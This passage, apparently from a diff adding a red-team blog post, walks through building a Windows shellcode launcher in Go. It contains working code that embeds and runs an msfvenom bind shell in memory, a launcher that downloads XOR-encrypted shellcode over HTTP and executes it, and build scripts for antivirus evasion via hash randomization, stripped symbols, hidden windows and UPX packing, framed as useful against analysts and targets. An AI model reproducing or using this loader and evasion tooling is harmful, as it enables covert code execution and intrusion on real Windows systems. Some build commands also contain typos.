+  &lt;li&gt;Use VirtualProtect to change the permissions on the allocated memory region&lt;/li&gt;
+  &lt;li&gt;Use CreateThread to create a thread that points to the shellcode&lt;/li&gt;
+  &lt;li&gt;Use WaitForSingleObject to stall the program until the shellcode execution is complete&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The VirtualProtect, RtlCopyMemory, VirtualProtect, CreateThread, and WaitForSingleObject functions are all Win32 API function within kernel32.dll and ntdll.dll, which will be imported using the Go NewLazyDLL function. Here’s some reference information to provide deeper insight into a few of the moving parts, including how VirtualProtect works. I also outlined a nearly identical process in my Python Shellcode Injection blog post, so check that out for more information.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&quot;&gt;VirtualProtect&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory&quot;&gt;RtlCopyMemory&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&quot;&gt;CreateThread&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject&quot;&gt;WaitForSingleObject&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://golangnews.org/2020/06/using-windows-com-api-in-golang/&quot;&gt;NewLazyDLL Info&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724&quot;&gt;A nice article on this topic&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Okay, onto the code. First, define the package and import the other packages.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;encoding/base64&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;unsafe&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, define some constants to use when calling the win32 functions.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const (
+  MEM_COMMIT = 0x1000
+  MEM_RESERVE = 0x2000
+  PAGE_EXECUTE_READ = 0x20
+  PAGE_READWRITE = 0x04
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, create the main function. Here’s a breakdown of what’s happening:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Creating a variable to contain some sample base64 encoded shellcode (I’m using an msfvenom tcp bind shell).&lt;/li&gt;
+  &lt;li&gt;Decoding the base64 into bytes.&lt;/li&gt;
+  &lt;li&gt;Loading the DLLs using syscall.NewLazyDLL.&lt;/li&gt;
+  &lt;li&gt;Defining the win32 functions that will be used.&lt;/li&gt;
+  &lt;li&gt;Performing the Virtualloc, RtlCopyMemory, and VirtualProtect calls to create the memory region, copy the shellcode to it, and set the memory region permissions.&lt;/li&gt;
+  &lt;li&gt;Calling the shellcode using CreateThread, and using WaitForSingleObject to wait for the shellcode to complete before closing the program.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func main() {
+  sc_b64 := &quot;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACD7AAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==&quot;
+
+  sc, _ := base64.StdEncoding.DecodeString(sc_b64)
+
+  kernel32 := syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
+  ntdll := syscall.NewLazyDLL(&quot;ntdll.dll&quot;)
+
+  VirtualAlloc := kernel32.NewProc(&quot;VirtualAlloc&quot;)
+  VirtualProtect := kernel32.NewProc(&quot;VirtualProtect&quot;)
+  RtlCopyMemory := ntdll.NewProc(&quot;RtlCopyMemory&quot;)
+  CreateThread := kernel32.NewProc(&quot;CreateThread&quot;)
+  WaitForSingleObject := kernel32.NewProc(&quot;WaitForSingleObject&quot;)
+
+  addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+  RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;sc[0])), uintptr(len(sc)))
+
+  oldProtect := PAGE_READWRITE
+  VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&amp;amp;oldProtect)))
+
+  thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+
+  WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note the base64 encoded shellcode in the sc_b64 variable. This is a msfvenom bind shell. Check out the commands below to see how I generated this on my Kali host.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@kali:~$ msfvenom -a x64 -p windows/x64/shell_bind_tcp RHOST=0.0.0.0 LPORT=8443 -f raw -o windows_x64_bind.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 505 bytes
+Saved as: windows_x64_bind.bin
+mmusic@kali:~$ base64 ./windows_x64_bind.bin -w0                                                                 /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACD7AAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Compile this go file into an exe for your appropriate architecture.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export GOOS=windows
+export GOARCH=adm64
+go build runner.go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Give it a run and confirm the shellcode exection.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/go_shellcode_1.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/go_shellcode_2.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;creating-the-launcher&quot;&gt;Creating the Launcher&lt;/h2&gt;
+
+&lt;p&gt;At this point, the picture of how the final Launcher will be composed should be clear. I’m going to take one of the encryption techniques, one of the acquisition techniques, and the execution technique and bundle them all together. This sample Launcher will:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Download XOR encrypted shellcode via HTTP.&lt;/li&gt;
+  &lt;li&gt;Decrypt the XOR encrypted shellcode and insert into memory.&lt;/li&gt;
+  &lt;li&gt;Execute the shellcode using the method outlined by Ne0nd0g &lt;a href=&quot;https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateThread/main.go&quot;&gt;here&lt;/a&gt;. &lt;strong&gt;Check out the other cool injection methods that Ne0ndog has on this repo!&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;As usual, define the package and import the used packages.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;encoding/base64&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;unsafe&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;io/ioutil&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;net/http&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add in the constants for use in the win32 function calls.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const (
+  MEM_COMMIT = 0x1000
+  MEM_RESERVE = 0x2000
+  PAGE_EXECUTE_READ = 0x20
+  PAGE_READWRITE = 0x04
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, add the decryption function. In this case, XOR (encryption and decryption functions are the same for XOR).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func EncryptXOR(plaintext, key []byte) []byte {
+  ciphertext := make([]byte, len(plaintext))
+  for i := 0; i &amp;lt; len(plaintext); i++ {
+    ciphertext[i] = plaintext[i] ^ key[i % len(key)]
+  }
+
+  return ciphertext
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Define the main function. This is where the HTTP download happens, the decryption function is called, and the injection happens. &lt;strong&gt;Make sure the key defined here is the same as the key used to encrypt the payload&lt;/strong&gt;. Also double check that the payload is hosted at the location specified in the url variable.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func main() {
+  url := &quot;http://administration.lab.mordor:8080/download_me.txt&quot;
+  user_agent := &quot;Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;
+  key := &quot;0123456789123456&quot;
+
+  req, _ := http.NewRequest(&quot;GET&quot;, url, nil)
+  req.Header.Set(&quot;User-Agent&quot;, user_agent)
+  client := &amp;amp;http.Client{}
+  resp, _ := client.Do(req)
+
+  defer resp.Body.Close()
+
+  content, _ := ioutil.ReadAll(resp.Body)
+  ciphertext_b64 := content
+
+  ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64))
+  plaintext := EncryptXOR(ciphertext, []byte(key))
+
+  sc := plaintext
+
+  kernel32 := syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
+  ntdll := syscall.NewLazyDLL(&quot;ntdll.dll&quot;)
+
+  VirtualAlloc := kernel32.NewProc(&quot;VirtualAlloc&quot;)
+  VirtualProtect := kernel32.NewProc(&quot;VirtualProtect&quot;)
+  RtlCopyMemory := ntdll.NewProc(&quot;RtlCopyMemory&quot;)
+  CreateThread := kernel32.NewProc(&quot;CreateThread&quot;)
+  WaitForSingleObject := kernel32.NewProc(&quot;WaitForSingleObject&quot;)
+
+  addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+  RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;sc[0])), uintptr(len(sc)))
+
+  oldProtect := PAGE_READWRITE
+  VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&amp;amp;oldProtect)))
+
+  thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+
+  WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Save to launcher.go and compile.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export GOOS=windows
+export GOOS=amd64
+go build launcher.go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Before testing on a Windows box, generate and host the encrypted shellcode. To generate, use the xor.go file that I demonstrated earlier. &lt;strong&gt;Make sure you use the same key as the one defined in launcher.go.&lt;/strong&gt; Here’s my command, using the key shown in my launcher.go.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go run ./xor.go &quot;windows_x64_bind.bin&quot; &quot;0123456789123456&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I added the ‘final message’ output of this to download_me.txt, and hosted it using python -m SimpleHTTPServer 8080.&lt;/p&gt;
+
+&lt;p&gt;Now, test the Launcher. Note the console output. This is just for debugging purposes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/go_shellcode_4.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/go_shellcode_3.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice. It worked. At this point, the Launcher is complete. There are plenty of other changes that can be made, but I hope the general idea for building a quick shellcode Launcher in Go makes sense. These techniques aren’t novel, but the formula is modular enough that anyone can substitute a ‘technique’ demonstrated for something more advanced.&lt;/p&gt;
+
+&lt;h2 id=&quot;useful-code&quot;&gt;Useful Code&lt;/h2&gt;
+
+&lt;p&gt;While writing Launchers in Go, I’ve found some neat tricks to aid in binary obfuscation and streamlining the build process.&lt;/p&gt;
+
+&lt;h3 id=&quot;hash-randomization&quot;&gt;Hash Randomization&lt;/h3&gt;
+
+&lt;p&gt;It’s nice to have the hash of your binary randomized with each binary that you distribute, whether that be for testing against AV or distributing to your target. To do this, I create a ‘hash randomizer’ variable for population at build time. So long as this variable changes with each build, the binary hash will be different.&lt;/p&gt;
+
+&lt;p&gt;Define a variable called “randomizer” somewhere in your launcher, and print it out.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;randomizer := &quot;\{\{ RANDOMIZER \}\}&quot;
+fmt.Println(&quot;[+] Randomizer: &quot;, randomizer)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, create a build script by dropping the following into build.sh.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;randomizer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/urandom | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a-zA-Z0-9'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;fold&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 16 | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;launcher.go ./launcher-build.go
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\{\{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; RANDOMIZER &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\}\}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$randomizer&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/g&quot;&lt;/span&gt; launcher-build.go
+&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;amd64 go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; launcher.exe  launcher-build.go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Make build.sh executable, and run it. You should see the newly generated launcher.exe (with a randomized hash) and the launcher-build.go file, which includes the randomized randomization string.&lt;/p&gt;
+
+&lt;h3 id=&quot;key-randomization&quot;&gt;Key Randomization&lt;/h3&gt;
+
+&lt;p&gt;The same process as above can be applied to generate a randomized key for each build of the .exe file. This is just good opsec, and will also change the binary hash. Randomized length keys could also be a fun way to throw off the prying eyes of analysts on a campaign!&lt;/p&gt;
+
+&lt;h3 id=&quot;build-flags&quot;&gt;Build Flags&lt;/h3&gt;
+
+&lt;p&gt;Using the ldflags command line argument when building a Go binary allows you to send specific build options to the Go linker. There are a couple of flags that I’ve been using in my Go launcher builds with success:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;-s and -w: Both of these string the symbol table and debug information from the binary.&lt;/li&gt;
+  &lt;li&gt;-H=windowsgui: This flag hides the cmd.exe program while the launcher executes (hidden window).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;These can be passed during the go build process as shown below.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go build -ldflags=&quot;-s -w -H=windowsgui&quot; launcher.go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;packing&quot;&gt;Packing&lt;/h3&gt;
+
+&lt;p&gt;After the binary is built, I’ve been packing it using UPX. This helps against certain AVs that may catch the already stealthy launcher. It also shrinks the binaries by a considerable amount, which is great.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upx --brute launcher.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Note that using UPX with the –brute flag takes some time.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;build-script&quot;&gt;Build Script&lt;/h3&gt;
+
+&lt;p&gt;Combining this all into one streamlined build script for several shellcodes, different launcher versions, or different architectures is great. The ability to easily build windows binaries on a Linux host is one of the reasons that I love Go, and creating a build script takes advantage of that capability.&lt;/p&gt;
+
+&lt;p&gt;Here’s a sample build script that generates encrypted shellcode for two payloads, inserts a random key and randomization string into the launcher Go file, builds it, and packs it. &lt;strong&gt;This is just the tip of the iceberg. Take some time to experiment with a build pipeline for your launchers&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;SHELLCODEX64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;windows_x64_bind.bin&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;SHELLCODEX86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;windows_x86_bind.bin&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;randomizer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/urandom | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a-zA-Z0-9'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;fold&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 16 | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/urandom | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0-9'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;fold&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 16 | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;launcher.go ./launcher-build.go
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\{\{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; RANDOMIZER &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\}\}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$randomizer&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/g&quot;&lt;/span&gt; launcher-build.go
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\{\{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; KEY &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\}\}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$randomizer&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/g&quot;&lt;/span&gt; launcher-build.go
+
+&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;amd64 go run ./xor.go &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SHELLCODEX64&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;amd64 go run ./xor.go &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SHELLCODEX86&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;amd64 go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; launcher64.exe &lt;span class=&quot;nt&quot;&gt;-ldflags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-s -w -H=windowsgui&quot;&lt;/span&gt; launcher-build.go
+&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;386 go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; launcher32.exe &lt;span class=&quot;nt&quot;&gt;-ldflags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-s -w -H=windowsgui&quot;&lt;/span&gt; launcher-build.go
+
